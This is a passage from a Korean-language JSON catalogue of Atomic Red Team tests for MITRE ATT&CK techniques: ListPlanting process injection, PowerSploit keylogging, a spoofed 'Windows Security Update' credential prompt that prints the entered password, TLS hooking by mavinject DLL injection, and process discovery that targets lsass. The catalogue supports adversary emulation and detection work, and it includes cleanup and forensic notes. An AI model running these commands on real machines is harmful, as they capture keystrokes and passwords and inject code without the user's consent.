        "각 테스트별 cleanup_command에 따라 CalculatorApp와 werfault 프로세스를 종료.",
        "연구 환경을 초기화하려면 PathToAtomicsFolder\\T1055.012\\bin\\x64 내 CreateProcess*.exe 바이너리를 삭제하거나 격리할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "c8f98fe1-c89b-4c49-a7e3-d60ee4bc2f5a / 94903cc5-d462-498a-b919-b1e5ab155fee"
      }
    }
  ]
},
{
  "technique_id": "T1055.015",
  "technique_name": "Process Injection: ListPlanting",
  "tactic": "Defense Evasion",
  "description": "ListPlanting은 ListView 컨트롤을 가진 윈도우(예: RegEdit)를 악용해 원격 프로세스에 셸코드를 주입하는 프로세스 인젝션 기법이다. 공격자는 타깃 프로세스의 메모리에 NtWriteVirtualMemory로 코드(셸코드)를 써 넣고, PostMessage 등 윈도우 메시지 기반 트리거를 이용해 해당 코드를 실행한다. 이 기법은 일반적인 VirtualAlloc/WriteProcessMemory/CreateRemoteThread 패턴 대신 UI 컨트롤과 메시지 큐를 활용하기 때문에, 일부 탐지 로직을 우회하는 데 사용될 수 있다.",

  "tests": [
    {
      "test_id": "T1055.015-1",
      "name": "Process injection ListPlanting",
      "platforms": ["windows"],
      "summary": "ListPlanting.exe를 이용해 RegEdit 프로세스의 ListView 컨트롤을 악용, NtWriteVirtualMemory + PostMessage를 통해 셸코드를 주입/실행하는 시나리오. 성공 시 \"Warning / Atomic Red Team\" 메시지 박스가 뜬 뒤 Notepad가 실행된다.",
      "procedure": [
        "1) 의존성(Prereq) 준비:",
        "   - exe_binary: ListPlanting 인젝터 경로",
        "       · 기본값: PathToAtomicsFolder\\T1055.015\\bin\\ListPlanting.exe",
        "",
        "   - PowerShell dependency 로직:",
        "     1) prereq_command:",
        "        · if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}",
        "        → 지정한 경로에 ListPlanting.exe가 없으면 get_prereq_command 실행.",
        "     2) get_prereq_command:",
        "        · New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null",
        "        · Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe\" -OutFile \"#{exe_binary}\"",
        "        → GitHub에서 ListPlanting.exe를 다운로드해 PathToAtomicsFolder\\T1055.015\\bin에 저장.",
        "",
        "2) 인젝션 실행:",
        "   - PowerShell executor에서 다음 명령 수행:",
        "     · Start-Process \"#{exe_binary}\"",
        "       - ListPlanting.exe 실행.",
        "       - 내부 동작(요약 예상):",
        "         1) RegEdit 프로세스를 찾거나 새로 실행 (ListView 컨트롤을 가진 타깃 윈도우 식별).",
        "         2) NtWriteVirtualMemory를 사용해 RegEdit 프로세스의 메모리에 셸코드를 기록.",
        "         3) ListView 컨트롤/윈도우 핸들로 PostMessage 등을 보내, 셸코드 실행이 일어나는 코드 경로를 트리거.",
        "         4) 셸코드가 MessageBox(\"Warning\", \"Atomic Red Team\")를 띄우고, 이후 Notepad를 실행.",
        "",
        "     · Start-Sleep -Seconds 7",
        "       - 인젝션 및 메시지 박스, Notepad 실행이 완료될 시간을 기다림.",
        "",
        "     · Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
        "       - 테스트 종료를 위해 Notepad 프로세스를 강제 종료.",
        "",
        "3) 결과:",
        "   - 정상 시나리오:",
        "     · 몇 초 내에 메시지 박스가 나타남:",
        "         - 제목: \"Warning\"",
        "         - 내용: \"Atomic Red Team\"",
        "     · 메시지 박스 이후 Notepad가 자동으로 실행.",
        "   - 이는 RegEdit(또는 타깃 프로세스) 내부에서 셸코드가 실행되었음을 의미.",
        "",
        "4) 정리(Cleanup):",
        "   - Atomic 정의의 cleanup_command:",
        "     · Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
        "   - 추가로 실험 환경 정리를 위해:",
        "     · PathToAtomicsFolder\\T1055.015\\bin\\ListPlanting.exe 파일을 삭제 또는 별도 샌드박스 위치로 이동 가능.",
        "     · RegEdit/테스트 중 사용한 프로세스가 남아 있으면 수동 종료."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
          "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
        }
      ],
      "prerequisites": [
        "Windows 환경에서 PowerShell 실행 가능해야 함.",
        "PathToAtomicsFolder\\T1055.015\\bin 경로가 존재해야 함(없으면 get_prereq_command가 생성).",
        "해당 경로에 ListPlanting.exe가 존재해야 함(없으면 GitHub에서 다운로드).",
        "테스트 시 RegEdit/타깃 프로세스와 상호작용할 수 있을 정도의 권한 필요.",
        "executor에 elevation_required: true로 지정되어 있으므로 관리자 권한 PowerShell 세션이 권장됨."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1055.015\\bin\\ListPlanting.exe",
            "description": "ListView 기반 ListPlanting 프로세스 인젝터 실행 파일"
          }
        ],
        "files_read": [],
        "processes": [
          {
            "name": "ListPlanting.exe",
            "description": "RegEdit 프로세스에 셸코드를 주입하기 위해 실행되는 인젝터 프로세스"
          },
          {
            "name": "regedit.exe (추정)",
            "description": "ListView 컨트롤을 가진 타깃 프로세스. NtWriteVirtualMemory + PostMessage를 통해 셸코드가 주입/실행됨."
          },
          {
            "name": "notepad.exe",
            "description": "셸코드 실행 결과로 생성되는 예시 프로세스. 메시지 박스 이후 실행되며, 테스트 종료 시 종료 대상."
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "cleanup_command에서 Notepad 프로세스를 종료:",
        "  · Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
        "포렌식/연구용이 아니라면, PathToAtomicsFolder\\T1055.015\\bin 하위의 ListPlanting.exe를 삭제해 환경을 정리할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "4f3c7502-b111-4dfe-8a6e-529307891a59"
      }
    }
  ]
},
{
  "technique_id": "T1056.001",
  "technique_name": "Input Capture: Keylogging",
  "tactic": "Collection",
  "description": "공격자는 키 입력(키보드 입력)을 후킹해 사용자의 계정 정보, 명령어 등을 수집할 수 있다. Windows 환경에서는 PowerSploit의 Get-Keystrokes.ps1 같은 스크립트를 이용해 콘솔/윈도우 전반의 키 입력을 백그라운드에서 로깅하며, 결과를 로컬 로그 파일에 저장하는 방식으로 동작한다.",

  "tests": [
    {
      "test_id": "T1056.001-1",
      "name": "Input Capture via PowerSploit Get-Keystrokes.ps1",
      "platforms": ["windows"],
      "summary": "PowerSploit의 Get-Keystrokes.ps1를 디스크에 위치시킨 뒤, PowerShell로 실행하여 지정한 경로(기본: %TEMP%\\key.log)에 키 입력을 기록하는 키로거 시나리오.",
      "procedure": [
        "1) 의존성(Prereq) 준비:",
        "   - 필요한 파일:",
        "     · PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1",
        "",
        "   - PowerShell dependency 로직:",
        "     1) prereq_command:",
        "        · if (Test-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") {exit 0} else {exit 1}",
        "        → 지정 경로에 스크립트가 없으면 get_prereq_command 실행.",
        "",
        "     2) get_prereq_command:",
        "        · New-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") -Force | Out-Null",
        "        · Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\"",
        "        → Atomic Red Team GitHub에서 Get-Keystrokes.ps1를 내려받아 저장.",
        "",
        "2) 키로거 실행:",
        "   - 입력 인자:",
        "     · filepath: 로컬 로그 파일 경로",
        "       - 기본값: $env:TEMP\\key.log",
        "",
        "   - PowerShell executor 명령:",
        "     · &\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath #{filepath}",
        "",
        "   - 동작 개요:",
        "     1) Get-Keystrokes.ps1가 키보드 후킹(저수준 키보드 훅 또는 Win32 API)을 설정.",
        "     2) 이후 세션 내에서 발생하는 키 입력을 실시간으로 감지.",
        "     3) 감지한 키를 문자열로 가공하여 지정된 로그 파일(예: %TEMP%\\key.log)에 기록.",
        "     4) 특정 윈도우 타이틀/포커스 등과 함께 기록될 수 있어, 어떤 프로그램에서 어떤 키가 눌렸는지 추적 가능.",
        "",
        "3) 결과 확인:",
        "   - 테스트 후 %TEMP%\\key.log (또는 #{filepath} 인자로 지정한 경로)를 열어 키 입력 로그를 확인.",
        "   - 로그에는 입력된 키, 타임스탬프, 포커스된 윈도우 정보 등이 포함될 수 있음.",
        "",
        "4) 정리(Cleanup):",
        "   - Atomic 정의의 cleanup_command:",
        "     · Remove-Item $env:TEMP\\key.log -ErrorAction Ignore",
        "   - 필요 시:",
        "     · 로그 파일이 다른 경로에 생성되었으면 해당 파일도 수동 삭제.",
        "     · 키로거 스크립트 자체(Get-Keystrokes.ps1)를 포렌식/연구 용도가 아니라면 삭제 가능."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "&\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath #{filepath}",
          "cleanup_command": "Remove-Item $env:TEMP\\key.log -ErrorAction Ignore"
        }
      ],
      "prerequisites": [
        "Windows 환경에서 PowerShell 실행 가능해야 함.",
        "PathToAtomicsFolder 경로 구조가 사전에 정의되어 있어야 함.",
        "PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1 파일이 존재해야 함(없으면 get_prereq_command가 GitHub에서 다운로드).",
        "키보드 후킹 및 파일 기록을 위한 권한이 필요하며, Atomic 정의상 elevation_required: true 이므로 관리자 권한 PowerShell 세션이 권장됨."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1",
            "description": "PowerSploit 기반 키스트로크 수집 스크립트"
          },
          {
            "path": "%TEMP%\\key.log",
            "description": "캡처된 키 입력이 기록되는 로그 파일(기본값). filepath 인자를 바꾸면 다른 경로에 생성될 수 있음."
          }
        ],
        "files_read": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Get-Keystrokes.ps1를 실행해 키보드 후킹 및 로그 기록을 수행하는 프로세스"
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "기본 로그 파일 삭제:",
        "  · Remove-Item $env:TEMP\\key.log -ErrorAction Ignore",
        "테스트 후 환경 정리를 위해 필요 시 Get-Keystrokes.ps1 스크립트도 삭제하거나 별도 연구 디렉터리로 이동할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "d9b633ca-8efb-45e6-b838-70f595c6ae26"
      }
    }
  ]
},
{
  "technique_id": "T1056.002",
  "technique_name": "Input Capture: GUI Input Capture",
  "tactic": "Collection",
  "description": "공격자는 운영체제 또는 일반 사용자에게 익숙한 GUI(그래픽 사용자 인터페이스) 창을 띄워 비밀번호·계정 정보를 입력하도록 유도하는 로컬 피싱(Local Phishing) 기법을 사용할 수 있다. Windows 환경에서는 PowerShell의 자격 증명 입력 창(PromptForCredential)을 악용해 합법적인 보안 알림처럼 보이는 팝업을 띄운 뒤, 사용자가 입력한 비밀번호를 수집하는 방식으로 동작한다.",

  "tests": [
    {
      "test_id": "T1056.002-1",
      "name": "PowerShell - Prompt User for Password (Local Phishing)",
      "platforms": ["windows"],
      "summary": "PowerShell의 PromptForCredential GUI 창을 이용해 ‘Windows Security Update’ 알림처럼 보이는 비밀번호 입력 팝업을 띄우고, 사용자가 입력한 비밀번호를 콘솔로 출력하는 로컬 피싱(credential prompt spoofing) 시나리오.",
      "procedure": [
        "1) PowerShell 실행:",
        "   - 공격자는 PowerShell 콘솔 또는 스크립트에서 아래 명령을 실행한다.",
        "",
        "2) 비밀번호 입력 창 생성:",
        "   - $host.UI.PromptForCredential()을 호출해 다음과 같은 속성을 가진 자격 증명 입력 창을 띄운다.",
        "     · 제목(캡션): 'Windows Security Update'",
        "     · 메시지: 공백(두 번째 인자를 빈 문자열로 전달)",
        "     · 기본 사용자명: 현재 [Environment]::UserName",
        "     · 도메인: [Environment]::UserDomainName",
        "",
        "   - 사용자는 실제 시스템 업데이트나 보안 알림처럼 인식하고, 사용자 이름과 비밀번호를 입력하게 된다.",
        "",
        "3) 비밀번호 추출:",
        "   - 사용자 입력을 받은 뒤, 반환된 $cred 객체에서 다음과 같이 비밀번호를 추출한다.",
        "     · $cred.GetNetworkCredential().Password",
        "   - Atomic 정의에서는 write-warning를 사용하여, Invoke-AtomicTest 프레임워크에서도 콘솔에 비밀번호를 표시되도록 한다.",
        "",
        "4) 결과:",
        "   - 콘솔/로그 상에 사용자가 입력한 비밀번호 문자열이 노출된다.",
        "   - 실제 공격에서는 이 비밀번호를 파일로 기록하거나 네트워크를 통해 외부로 전송하는 방식으로 연계될 수 있다.",
        "",
        "5) 종료 및 정리:",
        "   - 이 테스트는 별도의 파일·레지스트리 아티팩트를 남기지 않고, PowerShell 프로세스 종료 시 함께 종료된다.",
        "   - 포렌식 관점에서는 PowerShell 실행 이력(예: PowerShell Operational 로그, ScriptBlock 로그 등)을 통해 명령 내역을 추적할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "# Creates GUI to prompt for password. Expect long pause before prompt is available.\n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password",
          "cleanup_command": ""
        }
      ],
      "prerequisites": [
        "Windows 환경에서 PowerShell이 실행 가능해야 함.",
        "호스트가 GUI 환경(콘솔/터미널이 아니라도 상관없지만, 사용자 상호작용이 가능한 세션)이어야 하며, 사용자가 팝업 창을 볼 수 있어야 함.",
        "PowerShell 호스트($host.UI)가 PromptForCredential 메서드를 지원해야 함(기본 PowerShell 콘솔/ISE/Windows 터미널 등)."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "자격 증명 입력 GUI를 띄우고 사용자가 입력한 비밀번호를 수집하는 스크립트를 실행하는 프로세스."
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "별도의 파일/레지스트리 아티팩트가 생성되지 않으므로 기본적으로 추가 정리 작업은 필요 없다.",
        "테스트 종료 후에는 PowerShell 세션을 종료하여 추가적인 키/비밀번호 수집이 이루어지지 않도록 한다.",
        "실제 운영 환경에서의 재현 후에는 PowerShell 로그(Operational, ScriptBlock)를 점검하여 해당 명령 사용 여부를 확인할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "2b162bfd-0928-4d4c-9ec3-4d9f88374b52"
      }
    }
  ]
},
{
  "technique_id": "T1056.004",
  "technique_name": "Input Capture: Credential API Hooking",
  "tactic": "Collection / Credential Access",
  "description": "공격자는 TLS/로그온/자격 증명과 관련된 API를 후킹(hooking)하여, 정상 애플리케이션(예: PowerShell) 내부에서 처리되는 평문 데이터를 가로챌 수 있다. 이 테스트에서는 PowerShell 프로세스에 DLL을 인젝션한 뒤, TLS 통신용 암·복호화 함수(SChannel 등)를 후킹하여 Invoke-WebRequest를 통해 전송되는 HTTPS 트래픽 내용을 내부에서 확인할 수 있도록 한다.",

  "tests": [
    {
      "test_id": "T1056.004-1",
      "name": "Hook PowerShell TLS Encrypt/Decrypt Messages",
      "platforms": ["windows"],
      "summary": "mavinject.exe를 사용해 현재 PowerShell 프로세스에 후킹용 DLL(T1056.004x64.dll)을 주입하고, 그 상태에서 Invoke-WebRequest로 HTTPS 요청을 전송하여 TLS 암·복호화 API를 후킹하는 시나리오.",
      "procedure": [
        "1) 사전 준비:",
        "   - T1056.004x64.dll이 다음 기본 경로에 존재해야 한다:",
        "     · PathToAtomicsFolder\\T1056.004\\bin\\T1056.004x64.dll",
        "   - 존재하지 않을 경우 Atomic 정의의 get_prereq_command에 따라 GitHub에서 DLL을 다운로드한다.",
        "",
        "2) PowerShell 관리자 권한 실행:",
        "   - 본 테스트는 mavinject를 사용하므로, 일반적으로 관리자 권한 PowerShell 세션에서 실행한다.",
        "",
        "3) DLL 인젝션 수행:",
        "   - PowerShell에서 다음 명령을 실행한다:",
        "     · mavinject $pid /INJECTRUNNING \"#{file_name}\"",
        "   - 여기서 $pid는 현재 PowerShell 프로세스의 PID를 의미하며, mavinject는 해당 프로세스에 지정된 DLL을 주입한다.",
        "   - DLL 내부에서는 TLS 암·복호화 관련 API(예: EncryptMessage/DecryptMessage, SChannel 계열 함수 등)를 후킹하도록 구현되어 있다고 가정한다.",
        "",
        "4) HTTPS 요청 발생:",
        "   - 같은 PowerShell 세션에서 다음 명령을 실행한다:",
        "     · Invoke-WebRequest #{server_name} -UseBasicParsing",
        "   - 기본값은 https://www.example.com 으로 GET 요청을 전송한다.",
        "   - 후킹된 DLL은 TLS 스트림이 암호화되기 전/복호화된 후의 평문 데이터를 내부적으로 캡처·로깅할 수 있다.",
        "",
        "5) 결과 확인:",
        "   - DLL 구현에 따라, 평문 요청/응답 데이터가 파일로 기록되거나, 디버그 출력/파이프 등으로 유출될 수 있다.",
        "   - Atomic 정의 상에서는 출력 위치가 명시되어 있지 않으나, 실제 공격자는 이 데이터를 외부 C2로 전송하거나, 디스크에 저장하여 후속 수집에 사용한다.",
        "",
        "6) 종료 및 정리:",
        "   - 테스트 종료 후에는 PowerShell 세션을 종료하거나, 인젝션된 DLL을 언로드(프로세스 종료 포함)하여 후킹을 제거한다.",
        "   - 포렌식 관점에서는:",
        "     · 프로세스 트리 내 mavinject.exe → powershell.exe 관계",
        "     · powershell.exe의 네트워크 연결(예: dst=www.example.com:443)",
        "     · Sysmon/ETW 기반 모듈 로드 이벤트(인젝션된 DLL 경로)",
        "     등을 단서로 탐지·분석이 가능하다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "mavinject $pid /INJECTRUNNING \"#{file_name}\"\nInvoke-WebRequest #{server_name} -UseBasicParsing",
          "cleanup_command": ""
        }
      ],
      "prerequisites": [
        "Windows 환경에서 PowerShell이 실행 가능해야 함.",
        "mavinject.exe가 시스템에 존재해야 하며(Windows 10 일부 빌드에 포함), 관리자 권한으로 실행되어야 할 수 있음.",
        "후킹용 DLL(T1056.004x64.dll)이 다음 경로에 존재해야 함:",
        "  · PathToAtomicsFolder\\T1056.004\\bin\\T1056.004x64.dll",
        "방화벽/프록시 정책이 #{server_name} (기본값: https://www.example.com) 에 대한 HTTPS 아웃바운드 연결을 허용해야 함."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1056.004\\bin\\T1056.004x64.dll",
            "description": "PowerShell 프로세스에 인젝션되어 TLS 암·복호화 API를 후킹하는 DLL. (get_prereq 과정에서 GitHub에서 다운로드됨)"
          }
        ],
        "files_read": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "테스트를 실행하고 TLS 요청(Invoke-WebRequest)을 발생시키는 프로세스. DLL이 인젝션되는 대상."
          },
          {
            "name": "mavinject.exe",
            "description": "현재 PowerShell 프로세스($pid)에 T1056.004x64.dll을 주입하기 위해 사용되는 도구."
          }
        ],
        "registry_keys": [],
        "network": [
          {
            "direction": "outbound",
            "protocol": "HTTPS",
            "destination": "#{server_name}",
            "description": "Invoke-WebRequest를 통해 생성된 TLS 세션. 후킹된 DLL이 내부 평문 데이터를 관찰할 수 있는 트래픽."
          }
        ]
      },
      "cleanup": [
        "별도의 자동 cleanup_command는 정의되어 있지 않으므로, 테스트 종료 후 PowerShell 세션을 종료하여 인젝션된 DLL을 함께 정리한다.",
        "실제 환경에서 재현한 경우, 다음을 추가로 점검할 수 있다:",
        "  · PathToAtomicsFolder\\T1056.004\\bin 아래 DLL 파일 삭제 여부 검토",
        "  · PowerShell 실행 이력(ScriptBlock 로그, Operational 로그 등)에서 mavinject 사용 내역 확인",
        "  · EDR/Sysmon 로그에서 모듈 로드, 프로세스 인젝션 관련 이벤트 분석"
      ],
      "metadata": {
        "atomic_source_id": "de1934ea-1fbf-425b-8795-65fb27dd7e33"
      }
    }
  ]
},
{
  "technique_id": "T1057",
  "technique_name": "Process Discovery",
  "tactic": "Discovery",
  "description": "공격자는 운영 중인 프로세스를 열람하여 보안 제품(AV/EDR), 크리티컬 프로세스(lsass.exe 등), 또는 후속 공격 대상 프로세스를 파악한다. 이 기법에서는 기본 내장 도구(tasklist, Get-Process, WMI, wmic)와 서드파티 도구(Process Hacker, PC Hunter), 그리고 GUI(Task Manager)를 활용해 프로세스를 식별한다.",

  "tests": [
    {
      "test_id": "c5806a4f-62b8-4900-980b-c7ec004e9908",
      "name": "Process Discovery - tasklist",
      "platforms": ["windows"],
      "summary": "cmd.exe에서 tasklist를 실행해 현재 시스템의 프로세스 목록을 확인한다.",
      "procedure": [
        "1) 명령 프롬프트(cmd.exe)를 연다.",
        "2) 아래 명령을 실행하여 전체 프로세스 목록을 확인한다.",
        "   · tasklist",
        "3) 결과로 각 프로세스 이름, PID, 메모리 사용량 등이 표 형식으로 출력된다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "tasklist",
          "cleanup_command": ""
        }
      ],
      "prerequisites": [
        "Windows 기본 명령인 tasklist.exe가 PATH 상에 존재해야 함(기본적으로 포함됨)."
      ],
      "artifacts": {
        "files_created": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "사용자가 명령을 입력하는 콘솔 프로세스."
          },
          {
            "name": "tasklist.exe",
            "description": "현재 실행 중인 프로세스를 열람하는 네이티브 도구."
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "별도의 아티팩트 생성 없음. 콘솔 창을 닫으면 종료."
      ],
      "metadata": {
        "atomic_source_id": "c5806a4f-62b8-4900-980b-c7ec004e9908"
      }
    },

    {
      "test_id": "3b3809b6-a54b-4f5b-8aff-cb51f2e97b34",
      "name": "Process Discovery - Get-Process",
      "platforms": ["windows"],
      "summary": "PowerShell의 Get-Process cmdlet을 사용해 현재 실행 중인 프로세스를 열람한다.",
      "procedure": [
        "1) PowerShell을 실행한다.",
        "2) 아래 명령을 실행해 프로세스 목록을 가져온다.",
        "   · Get-Process",
        "3) 프로세스 이름, PID, CPU 시간 등 다양한 정보가 표 형식으로 출력된다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-Process",
          "cleanup_command": ""
        }
      ],
      "prerequisites": [
        "Windows PowerShell이 실행 가능해야 함."
      ],
      "artifacts": {
        "files_created": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Get-Process 명령을 실행하는 프로세스."
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "PowerShell 세션 종료 외 별도 정리 필요 없음."
      ],
      "metadata": {
        "atomic_source_id": "3b3809b6-a54b-4f5b-8aff-cb51f2e97b34"
      }
    },

    {
      "test_id": "b51239b4-0129-474f-a2b4-70f855b9f2c2",
      "name": "Process Discovery - Get-WmiObject Win32_Process",
      "platforms": ["windows"],
      "summary": "PowerShell의 Get-WmiObject를 통해 WMI 클래스 Win32_Process를 조회하여 프로세스를 열람한다.",
      "procedure": [
        "1) PowerShell을 실행한다.",
        "2) 아래 명령을 실행한다.",
        "   · get-wmiObject -class Win32_Process",
        "3) 각 프로세스에 대한 상세 정보(CommandLine, ExecutablePath 등)를 WMI를 통해 조회한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "get-wmiObject -class Win32_Process",
          "cleanup_command": ""
        }
      ],
      "prerequisites": [
        "WMI 서비스가 동작 중이어야 하며, PowerShell에서 Get-WmiObject 사용이 가능해야 함."
      ],
      "artifacts": {
        "files_created": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WMI 쿼리를 수행하는 PowerShell 프로세스."
          },
          {
            "name": "WmiPrvSE.exe",
            "description": "WMI Provider Host (쿼리 시 함께 관찰될 수 있음)."
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "추가 변경 없음. 세션 종료 시 자동 정리."
      ],
      "metadata": {
        "atomic_source_id": "b51239b4-0129-474f-a2b4-70f855b9f2c2"
      }
    },

    {
      "test_id": "640cbf6d-659b-498b-ba53-f6dd1a1cc02c",
      "name": "Process Discovery - wmic process",
      "platforms": ["windows"],
      "summary": "wmic process get /format:list 명령을 통해 WMI 기반으로 전체 프로세스 목록과 속성을 조회한다.",
      "procedure": [
        "1) 명령 프롬프트(cmd.exe)를 연다.",
        "2) 다음 명령을 실행한다.",
        "   · wmic process get /format:list",
        "3) 각 프로세스에 대한 다양한 속성이 key=value 형식으로 리스트 출력된다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "wmic process get /format:list",
          "cleanup_command": ""
        }
      ],
      "prerequisites": [
        "wmic가 시스템에 존재해야 함(일부 최신 Windows 버전에서는 deprecated 또는 제거될 수 있음).",
        "WMI 인프라가 정상 동작해야 함."
      ],
      "artifacts": {
        "files_created": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "wmic 명령을 실행하는 콘솔 프로세스."
          },
          {
            "name": "wmic.exe",
            "description": "WMI를 통해 프로세스 정보를 질의하는 유틸리티."
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "출력은 콘솔에만 남으므로 별도 정리 필요 없음."
      ],
      "metadata": {
        "atomic_source_id": "640cbf6d-659b-498b-ba53-f6dd1a1cc02c"
      }
    },

    {
      "test_id": "11ba69ee-902e-4a0f-b3b6-418aed7d7ddb",
      "name": "Discover Specific Process - tasklist + findstr",
      "platforms": ["windows"],
      "summary": "tasklist 출력에 findstr를 결합해 특정 프로세스 이름(기본: lsass)을 검색한다.",
      "procedure": [
        "1) 명령 프롬프트(cmd.exe)를 연다.",
        "2) 특정 프로세스를 찾기 위해 다음 명령을 실행한다.",
        "   · tasklist | findstr #{process_to_enumerate}",
        "   (기본값: process_to_enumerate = 'lsass')",
        "3) 해당 문자열이 포함된 프로세스 행만 필터링되어 표시된다.",
        "   · 예: lsass.exe의 PID를 확인해 후속 메모리 덤프 공격 등으로 이어질 수 있음."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "tasklist | findstr #{process_to_enumerate}",
          "cleanup_command": ""
        }
      ],
      "prerequisites": [
        "tasklist와 findstr가 시스템에 존재해야 함(기본 포함)."
      ],
      "artifacts": {
        "files_created": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "파이프라인 명령을 실행하는 콘솔 프로세스."
          },
          {
            "name": "tasklist.exe",
            "description": "프로세스 목록을 출력하는 유틸리티."
          },
          {
            "name": "findstr.exe",
            "description": "문자열 검색에 사용되는 필터링 도구."
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "별도 정리 필요 없음. 콘솔 출력만 남는다."
      ],
      "metadata": {
        "atomic_source_id": "11ba69ee-902e-4a0f-b3b6-418aed7d7ddb"
      }
    },

    {
      "test_id": "966f4c16-1925-4d9b-8ce0-01334ee0867d",
      "name": "Process Discovery - Process Hacker",
      "platforms": ["windows"],
      "summary": "서드파티 도구 Process Hacker를 실행해 GUI로 프로세스/서비스 등 시스템 정보를 열람한다.",
      "procedure": [
        "1) 사전 준비 단계에서 Process Hacker가 다음 경로에 설치되어 있어야 한다.",
        "   · C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe",
        "   (없다면 get_prereq_command에 따라 설치용 exe를 다운로드 후 /s 옵션으로 무인 설치)",
        "",
        "2) PowerShell을 관리자 권한으로 실행한다.",
        "3) 다음 명령으로 Process Hacker를 실행한다.",
        "   · Start-Process -FilePath \"$Env:ProgramFiles\\Process Hacker 2\\#{processhacker_exe}\"",
        "4) GUI 상에서 프로세스 트리, 핸들, 스레드, 모듈, 서비스, 네트워크 연결 등을 상세히 확인할 수 있다.",
        "5) 공격자는 이를 활용해 보안 프로세스 종료, 인젝션 대상 탐색 등 후속 공격에 활용할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Start-Process -FilePath \"$Env:ProgramFiles\\Process Hacker 2\\#{processhacker_exe}\"",
          "cleanup_command": ""
        }
      ],
      "prerequisites": [
        "Process Hacker 2가 시스템에 설치되어 있어야 함.",
        "Atomic 정의 상, 미설치 시 C:\\Temp\\ExternalPayloads에 설치 파일을 다운로드하고 /s 옵션으로 설치.",
        "GUI 실행을 위해 인터랙티브 세션이 필요함."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "C:\\Program Files\\Process Hacker 2\\",
            "description": "Process Hacker 설치 디렉토리(사전 설치 또는 get_prereq 실행 시 생성)."
          }
        ],
        "processes": [
          {
            "name": "ProcessHacker.exe",
            "description": "고급 프로세스 뷰어/관리 도구. 악용 시 민감한 시스템 정보 획득 및 보안 우회에 사용될 수 있음."
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "테스트 종료 후 Process Hacker GUI를 종료한다.",
        "원하면 설치된 Process Hacker 프로그램을 제어판/스크립트로 제거할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "966f4c16-1925-4d9b-8ce0-01334ee0867d"
      }
    },

    {
      "test_id": "b4ca838d-d013-4461-bf2c-f7132617b409",
      "name": "Process Discovery - PC Hunter",
      "platforms": ["windows"],
      "summary": "PC Hunter 툴을 사용해 커널/프로세스/네트워크/시작 프로그램 등을 확인하고, 이를 통해 보안 우회 및 민감 정보 수집을 수행할 수 있다.",
